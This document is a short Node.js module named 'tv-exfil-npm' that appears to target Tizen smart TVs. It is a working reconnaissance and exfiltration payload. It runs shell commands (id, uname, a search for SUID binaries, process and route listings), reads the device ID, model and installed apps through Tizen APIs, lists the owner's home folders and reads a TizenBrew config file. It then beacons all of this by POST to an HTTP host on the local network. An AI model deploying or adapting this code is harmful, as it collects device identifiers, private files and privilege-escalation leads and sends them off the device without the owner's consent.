const fetch = require('node-fetch');

async function main() {
    const results = {
        source: "tv-exfil-npm",
        ts: new Date().toISOString(),
        shell: null,
        tizen: null,
        fs: null
    };

    // --- Try child_process (shell access) ---
    try {
        const { exec } = require('child_process');
        results.shell = { available: true };
        results.shell.id = await new Promise((r) => exec('id', {timeout:5000}, (e,o) => r(o||e.message)));
        results.shell.uname = await new Promise((r) => exec('uname -a', {timeout:5000}, (e,o) => r(o||e.message)));
        results.shell.suid = await new Promise((r) => exec('find / -perm -4000 -type f 2>/dev/null', {timeout:15000}, (e,o) => r(o||e.message)));
        results.shell.smack = await new Promise((r) => exec('cat /proc/security/lsm 2>/dev/null', {timeout:5000}, (e,o) => r(o||e.message)));
        results.shell.proc = await new Promise((r) => exec('ps 2>/dev/null || ls /proc/ 2>/dev/null | head -50', {timeout:8000}, (e,o) => r(o||e.message)));
        results.shell.net = await new Promise((r) => exec('cat /proc/net/route 2>/dev/null; cat /proc/net/fib_trie 2>/dev/null | grep -A1 "32 host" | head -20', {timeout:8000}, (e,o) => r(o||e.message)));
    } catch(e) {
        results.shell = { available: false, error: e.message };
    }

    // --- Try tizen APIs ---
    try {
        const t = typeof tizen !== 'undefined' ? tizen : (globalThis.tizen || (0, eval)('tizen'));
        if (t) {
            results.tizen = {
                version: t.systeminfo ? t.systeminfo.getCapability('http://tizen.org/feature/platform.version') : null,
                model: t.systeminfo ? t.systeminfo.getCapability('http://tizen.org/feature/model') : null,
                duid: t.systeminfo ? t.systeminfo.getCapability('http://tizen.org/feature/device.id') : null
            };
            results.tizen.apps = await new Promise((resolve) => {
                t.application.getAppInfo(
                    (l) => resolve(l.map(a => a.id + ' ' + a.name + ' v' + a.version)),
                    (e) => resolve('error: ' + e.message)
                );
            });
        }
    } catch(e) {
        results.tizen = { error: e.message };
    }

    // --- Try fs ---
    try {
        const fs = require('fs');
        results.fs = {
            home: fs.readdirSync('/home/owner/').join(','),
            share: fs.readdirSync('/home/owner/share/').join(','),
        };
        try { results.fs.tizenbrew_config = fs.readFileSync('/home/owner/share/.tizenbrewConfig.json','utf8'); } catch(e){}
    } catch(e) {
        results.fs = { error: e.message };
    }

    // Beacon
    try {
        const r = await fetch('http://192.168.0.73:8008/tv-results', {
            method: 'POST',
            headers: {'Content-Type':'application/json'},
            body: JSON.stringify(results)
        });
        console.log('[tv-exfil] beacon:', r.status);
    } catch(e) {
        console.log('[tv-exfil] beacon fail:', e.message);
    }
}

module.exports = { main };
